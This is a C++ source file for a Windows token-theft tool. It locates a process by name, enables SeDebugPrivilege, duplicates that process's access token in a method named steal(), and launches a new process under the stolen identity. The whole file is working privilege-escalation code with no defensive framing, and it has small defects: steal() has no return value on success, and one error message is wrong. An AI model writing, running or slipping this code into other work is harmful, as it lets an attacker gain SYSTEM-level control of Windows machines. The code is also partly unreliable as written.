#include "itoken.hpp"

IToken::IToken(const std::wstring& name) {
	findSystemProcess(name);
}

IToken::~IToken() {
	CloseHandle(token_);
	CloseHandle(proc);
}

IToken::IToken(IToken&& other) noexcept
	: token_(other.token_), source_pid_(other.source_pid_), proc(other.proc) {
	other.token_ = NULL; 
	other.source_pid_ = 0;
	other.proc = NULL;
}

IToken& IToken::operator=(IToken&& other) noexcept {
	if (this != &other) {
		if (token_) CloseHandle(token_);
		if (proc) CloseHandle(proc);

		token_ = other.token_;
		source_pid_ = other.source_pid_;
		proc = other.proc;

		other.token_ = NULL;
		other.source_pid_ = 0;
		other.proc = NULL;
	}
	return *this;
}

bool IToken::findSystemProcess(const std::wstring& name) {
	HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(snap, &pe32)) {
		CloseHandle(snap);
		throw std::runtime_error("error enum first process");
	}

	do {
		if (lstrcmpW(pe32.szExeFile, name.c_str()) == 0) {
			std::cout << "Found process!\n";
			source_pid_ = pe32.th32ProcessID;
		}

	} while (Process32Next(snap, &pe32));

	CloseHandle(snap);

	if (source_pid_ == 0) {
		std::cout << "Couldnt find the process!\n";
		return false;
	}

	proc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, source_pid_);

	if (proc == NULL) {
		std::cout << "Could open process w pid " << source_pid_ << "\n";
		return false;
	}

	return true;
}

bool IToken::enableDebugPrivilege() {
	HANDLE token_handle;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token_handle)) {
		std::cout << "error openprocesstoken (self) failed" << "\n";
		return false;
	}

	LUID luid;

	if (!LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &luid)) {
		CloseHandle(token_handle);
		std::cout << "error LookupPrivilegeValueA (self) failed" << "\n";
		return false;
	}

	TOKEN_PRIVILEGES tp;
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!AdjustTokenPrivileges(token_handle, FALSE, &tp, sizeof(tp), NULL, NULL)) {
		CloseHandle(token_handle);
		std::cout << "error AdjustTokenPrivileges (self) failed" << "\n";
		return false;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
		CloseHandle(token_handle);
		std::cout << "error ERROR_NOT_ALL_ASSIGNED failed" << "\n";
		return false;
	}

	CloseHandle(token_handle);
	return true;
}

bool IToken::steal() {
	HANDLE token_handle = NULL;

	if (!OpenProcessToken(proc, TOKEN_DUPLICATE | TOKEN_QUERY, &token_handle)) {
		std::cout << "error OpenProcessToken failed" << "\n";
		return NULL;
	}

	HANDLE duplicate_token;

	if (!DuplicateTokenEx(token_handle, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicate_token)) {
		std::cout << "error DuplicateTokenEx failed" << "\n";
		std::cout << GetLastError();
		return NULL;
	}

	token_ = duplicate_token;
}

bool IToken::spawnProcess(const std::wstring& path, const std::wstring& cmd) {
	STARTUPINFOW si = { sizeof(si) };
	PROCESS_INFORMATION pi = {};

	if (!CreateProcessWithTokenW(token_, 0, path.c_str(), const_cast<LPWSTR>(cmd.c_str()), 0, 0, 0, &si, &pi)) {
		std::cout << "error CreateProcessWithTokenW failed" << "\n";
		return false;
	}

	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	return true;
}